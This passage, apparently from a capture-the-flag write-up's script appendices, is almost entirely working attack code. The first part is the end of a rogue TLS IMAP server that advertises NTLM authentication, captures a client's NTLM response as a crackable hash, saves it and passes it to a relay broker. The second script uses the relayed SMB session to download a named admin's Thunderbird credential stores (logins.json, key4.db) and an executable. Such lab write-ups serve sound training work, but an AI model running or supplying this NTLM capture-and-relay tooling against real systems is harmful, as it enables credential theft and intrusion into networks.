            log('command %r' % command[:100])
            words = command.split()
            if len(words) < 2:
                continue
            tag, verb = words[0], words[1].upper()
            if verb == b'CAPABILITY':
                sock.sendall(
                    b'* CAPABILITY IMAP4rev1 AUTH=NTLM SASL-IR\r\n'
                    + tag + b' OK CAPABILITY completed\r\n'
                )
            elif verb == b'AUTHENTICATE' and len(words) >= 3 and words[2].upper() == b'NTLM':
                sock.sendall(b'+ \r\n')
                type1 = base64.b64decode(line(sock))
                if not type1.startswith(MAGIC) or struct.unpack_from('<I', type1, 8)[0] != 1:
                    raise ValueError('invalid NTLM Type 1')
                first_reply = broker('/type1', {'blob': base64.b64encode(type1).decode()})
                sid = first_reply['sid']
                challenge = bytes.fromhex(first_reply['challenge'])
                sock.sendall(b'+ ' + first_reply['blob'].encode() + b'\r\n')
                type3 = base64.b64decode(line(sock))
                if not type3.startswith(MAGIC) or struct.unpack_from('<I', type3, 8)[0] != 3:
                    raise ValueError('invalid NTLM Type 3')
                captured = hash_line(type3, challenge)
                with open(HASH, 'w') as handle:
                    handle.write(captured + '\n')
                log('type3 %d bytes user=%s' % (len(type3), captured.split('::', 1)[0]))
                result = broker('/type3', {
                    'sid': sid, 'blob': base64.b64encode(type3).decode(),
                })
                log('relay %s' % json.dumps(result))
                sock.sendall(tag + b' NO Authentication failed\r\n')
                return True
            else:
                sock.sendall(tag + b' BAD Unsupported command\r\n')
    finally:
        sock.close()

def main():
    os.umask(0o077)
    tls_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    tls_context.load_cert_chain(CERT, KEY)
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PORT))
    server.listen(5)
    server.settimeout(5)
    log('listening on %d' % PORT)
    deadline = time.time() + 180
    while time.time() < deadline:
        try:
            connection, address = server.accept()
        except socket.timeout:
            continue
        log('accepted %s:%d' % address)
        try:
            if address[0] != CLIENT:
                log('ignored non-WS02 source')
            elif session(connection, tls_context):
                break
        except Exception as exc:
            log('error %r' % exc)
        finally:
            try:
                connection.close()
            except Exception:
                pass
    server.close()
    log('exit')

if __name__ == '__main__':
    main()
```

## Script appendix C: copying files through the relayed SMB session

The broker returned a session ID after successful authentication. The following is a reconstructed standalone form of the read operations used in the run. Supply that ID through `RELAY_SID`; it changes on every relay.

```python
#!/usr/bin/env python3
import base64
import json
import os
from pathlib import Path
from urllib.request import Request, urlopen

sid = os.environ['RELAY_SID']
base = 'http://127.0.0.1:18081'

def post(route, **fields):
    body = json.dumps({'sid': sid, **fields}).encode()
    request = Request(
        base + route, body, headers={'Content-Type': 'application/json'}
    )
    with urlopen(request, timeout=20) as response:
        return json.load(response)

print(post(
    '/listpath',
    path=r'\Users\da-stephanie.lewis\AppData\Roaming\Thunderbird\Profiles\*',
))
profile = (r'\Users\da-stephanie.lewis\AppData\Roaming\Thunderbird'
           r'\Profiles\p3xppadz.default-release')
destination = Path('/tmp/ctf-thunderbird-profile')
destination.mkdir(exist_ok=True)
for name in ('logins.json', 'key4.db', 'logins-backup.json', 'prefs.js', 'cert9.db'):
    response = post('/getfile', path=profile + '\\' + name)
    (destination / name).write_bytes(base64.b64decode(response['blob']))

response = post('/getfile', path=r'\Users\stephanie.lewis\Videos\runas.exe')
Path('/tmp/ctf-ws02-runas.exe').write_bytes(base64.b64decode(response['blob']))
```




